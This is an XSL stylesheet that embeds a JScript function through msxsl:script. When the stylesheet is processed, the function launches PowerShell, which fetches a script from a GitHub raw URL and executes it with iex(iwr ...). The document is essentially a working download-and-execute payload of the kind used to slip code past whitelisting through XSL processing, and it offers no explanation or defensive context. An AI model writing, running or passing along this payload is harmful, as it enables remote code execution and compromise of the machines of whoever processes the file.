<?xml version='1.0'?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:user="http://mycompany.com/mynamespace">
	<msxsl:script language="JScript" implements-prefix="user">
		function apple() {

		var objShell = new ActiveXObject("WScript.shell");
		var WinNetwork = new ActiveXObject("WScript.Network");
		
		var env, computerName;
		env = new ActiveXObject("WScript.Shell").Environment("Process");

		objShell.run('powershell.exe iex(iwr https://raw.githubusercontent.com/br1337/Standoff/main/run.txt -usebasicparsing)');

		return 0;
		}
	</msxsl:script>
	<xsl:template match="/">
		<xsl:value-of select="user:apple()"/>
	</xsl:template>
</xsl:stylesheet>
